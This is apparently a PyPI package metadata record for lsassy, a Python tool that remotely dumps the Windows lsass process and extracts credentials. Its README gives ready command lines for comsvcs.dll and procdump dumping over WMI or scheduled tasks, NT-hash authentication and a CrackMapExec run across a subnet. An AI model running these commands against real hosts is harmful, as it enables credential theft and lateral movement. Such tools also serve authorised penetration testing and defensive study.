{
  "info": {
    "author": "Pixis",
    "author_email": "hackndo@gmail.com",
    "bugtrack_url": null,
    "classifiers": [
      "License :: OSI Approved :: MIT License",
      "Operating System :: OS Independent",
      "Programming Language :: Python :: 3.6",
      "Programming Language :: Python :: 3.7",
      "Programming Language :: Python :: 3.8",
      "Programming Language :: Python :: 3.9"
    ],
    "description": "# lsassy\n\n[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=1.1.1&x2=0)](https://pypi.org/project/lsassy/) [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)\n\n![CME Module example](https://github.com/Hackndo/lsassy/raw/master/assets/example.png)\n\nPython library to remotely extract credentials.\n\nBlog post : https://en.hackndo.com/remote-lsass-dump-passwords/\n\nThis library uses [impacket](https://github.com/SecureAuthCorp/impacket) project to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.\n\n| Chapters                                     | Description                                             |\n|----------------------------------------------|---------------------------------------------------------|\n| [Requirements](#requirements)                | Requirements to install lsassy from source              |\n| [Basic Usage](#basic-usage)                  | Command line template for standalone version            |\n| [Advanced Usage](#advanced)                  | Advanced usage (Dumping methods, execution methods, ...)|\n| [CrackMapExec Module](#crackmapexec-module)  | Link to CrackMapExec module included in this repository |\n| [Examples](#examples)                        | Command line examples for standalone and CME module     |\n| [Installation](#installation)                | Installation commands from pip or from source           |\n| [Issues](#issues)                            | Read this before creating an issue                      |\n| [Acknowledgments](#acknowledgments)          | Kudos to these people and tools                         |\n| [Contributors](#contributors)                | People contributing to this tool                        |\n\n## Requirements\n\n* Python >= 3.6\n* [pypykatz](https://github.com/skelsec/pypykatz) >= 0.3.0\n* [impacket](https://github.com/SecureAuthCorp/impacket)\n\n## Basic Usage\n\n```\nlsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target>\n```\n\n## Advanced\n\n### Dumping methods\n\nThis tool can dump lsass in different ways.\n\nDumping methods (`-m` or `--method`)\n* **0**: Try all methods to dump procdump, stop on success (Requires -p if dll fails)\n* **1**: comsvcs.dll method, stop on success (default)\n* **2**: Procdump method, stop on success (Requires -p)\n* **3**: comsvcs.dll + Powershell method, stop on success\n* **4**: comsvcs.dll + cmd.exe method\n\n#### comsvcs.dll method\n\nThis method **only uses built-in Windows files** to extract remote credentials. It uses **minidump** function from **comsvcs.dll** to dump **lsass** process.\n\nThis method can only be used when context has **SeDebugPrivilege**. This privilege is either in Powershell local admin context, or cmd.exe SYSTEM context.\n\nTwo execution methods can be used.\n1. **WMIExec** with cmd.exe (no SeDebugPrivilege), or powershell (SeDebugPrivilege)\n2. **ScheduledTasks** with SYSTEM context (SeDebugPrivilege)\n\n#### Procdump method\n\nThis method uploads **procdump.exe** from SysInternals to dump **lsass** process. It will first try to execute\nprocdump using WMI, and if it fails it will create a remote task, execute it and delete it.\n\n#### Examples\n\n```bash\nlsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 0 -p /path/to/procdump.exe\nlsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 1\nlsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 2 -p /path/to/procdump.exe\nlsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 3\nlsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target> -m 4\n```\n\n### Remote parsing only\n\nlsassy can parse an already dumped lsass process.\n\n```\nlsassy [--hashes [LM:]NT] --dumppath /share/path/to/dump.dmp [<domain>/]<user>[:<password>]@<target>\n```\n\n## CrackMapExec module\n\nI wrote a CrackMapExec module that uses **lsassy** to extract credentials on compromised hosts\n\nCrackMapExec module is in `cme` folder : [CME Module](https://github.com/Hackndo/lsassy/tree/master/cme)\n\n## Examples\n\n### lsassy\n\n```bash\n# RunDLL Method\nlsassy adsec.local/jsnow:Winter_is_coming@dc01.adsec.local\n\n# Procdump Method\nlsassy -p /tmp/procdump.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local\n\n# Remote parsing only\nlsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/jsnow:Winter_is_coming@dc01.adsec.local\n\n# NT Hash Authentication\nlsassy --hashes 952c28bd2fd728898411b301475009b7 Administrator@desktop01.adsec.local\n```\n\n### CME Module\n\n```\ncrackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound\n```\n\n## Installation\n\n### From pip\n\n```\npython3.7 -m pip install lsassy\n```\n\n### From sources\n\n```\npython3.7 setup.py install\n```\n\n### ChangeLog\n\n```\nv1.1.0\n------\n* Better execution process : --method flag has been added and described in help text\n* Uses random dump name\n* Chose between cmd, powershell, dll and/or procdump methods\n* CME module is now using light lsassy WMIExec et TASKExec implementation\n* Bug fixes\n\nv1.0.0\n------\n* Built-in lsass dump\n** Lsass dump using built-in Windows\n** Lsass dump using procdump (using -p parameter)\n* Add --dumppath to ask for remote parsing only\n* Code refactoring\n* Add --quiet to quiet output\n\nv0.2.0\n------\n* Add BloodHound option to CME module (-o BLOODHOUND=True)\n    - Set compromised targets as \"owned\" in BloodHound\n    - Check if compromised users have at least one path to domain admin\n* Custom parsing (json, grep, pretty [default])\n* New --hashes option to lsassy\n* Include CME module in repository\n* Add credentials to CME database\n\n\nv0.1.0\n------\nFirst release\n```\n\n## Issues\n\nIf you find an issue with this tool (that's very plausible !), please\n\n* Check that you're using the latest version\n* Send as much details as possible.\n    - For standalone **lsassy**, please use the `-d` debug flag\n    - For CME module, please use CrackMapExec `--verbose` flag\n\n## Acknowledgments\n\n* [Impacket](https://github.com/SecureAuthCorp/impacket)\n* [SkelSec](http://twitter.com/skelsec) for Pypykatz, but also for his patience and help\n* [mpgn](https://twitter.com/mpgn_x64) for his help and ideas\n\n## Contributors\n\n* [ITPPA](https://github.com/ITPPA/)\n* [viaccoz](https://github.com/viaccoz)\n\n\n",
    "description_content_type": "text/markdown",
    "docs_url": null,
    "download_url": "",
    "downloads": {
      "last_day": -1,
      "last_month": -1,
      "last_week": -1
    },
    "home_page": "https://github.com/hackanddo/lsassy",
    "keywords": "",
    "license": "MIT",
    "maintainer": "",
    "maintainer_email": "",
    "name": "lsassy",
    "package_url": "https://pypi.org/project/lsassy/",
    "platform": "",
    "project_url": "https://pypi.org/project/lsassy/",
    "project_urls": {
      "Homepage": "https://github.com/hackanddo/lsassy"
    },
    "release_url": "https://pypi.org/project/lsassy/1.1.1/",
    "requires_dist": [
      "impacket",
      "pypykatz (>=0.3.0)"
    ],
    "requires_python": ">=3.6",
    "summary": "Python library to parse remote lsass dumps",
    "version": "1.1.1",
    "yanked": false,
    "yanked_reason": null
  },
  "last_serial": 15789763,
  "urls": [
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "cbe58d15fc7c93c65e2488d0e5d24e1fc743f015441994750f922013407ab21a",
        "md5": "a1a5820c2281f6d69c4d7c9da22974be",
        "sha256": "d488db36ce5715f332fd375442d520497cd5758c9494f1fc1b61b4d4694576b3"
      },
      "downloads": -1,
      "filename": "lsassy-1.1.1-py3-none-any.whl",
      "has_sig": false,
      "md5_digest": "a1a5820c2281f6d69c4d7c9da22974be",
      "packagetype": "bdist_wheel",
      "python_version": "py3",
      "requires_python": ">=3.6",
      "size": 15637,
      "upload_time": "2020-01-08T13:26:06",
      "upload_time_iso_8601": "2020-01-08T13:26:06.230466Z",
      "url": "https://files.pythonhosted.org/packages/cb/e5/8d15fc7c93c65e2488d0e5d24e1fc743f015441994750f922013407ab21a/lsassy-1.1.1-py3-none-any.whl",
      "yanked": false,
      "yanked_reason": null
    },
    {
      "comment_text": "",
      "digests": {
        "blake2b_256": "d58fdb6c93402d1f998ff066b630db45ba1b42ad9fe2ce5e639676f12ac82f9b",
        "md5": "e254f1e0a7ab1ad66e9f83aba07146d3",
        "sha256": "e8bdd6b86648c99e8bdbb50dda8429ab0fd181f6e2e758a62c68d207ae8ed3d5"
      },
      "downloads": -1,
      "filename": "lsassy-1.1.1.tar.gz",
      "has_sig": false,
      "md5_digest": "e254f1e0a7ab1ad66e9f83aba07146d3",
      "packagetype": "sdist",
      "python_version": "source",
      "requires_python": ">=3.6",
      "size": 14289,
      "upload_time": "2020-01-08T13:26:08",
      "upload_time_iso_8601": "2020-01-08T13:26:08.054788Z",
      "url": "https://files.pythonhosted.org/packages/d5/8f/db6c93402d1f998ff066b630db45ba1b42ad9fe2ce5e639676f12ac82f9b/lsassy-1.1.1.tar.gz",
      "yanked": false,
      "yanked_reason": null
    }
  ],
  "vulnerabilities": []
}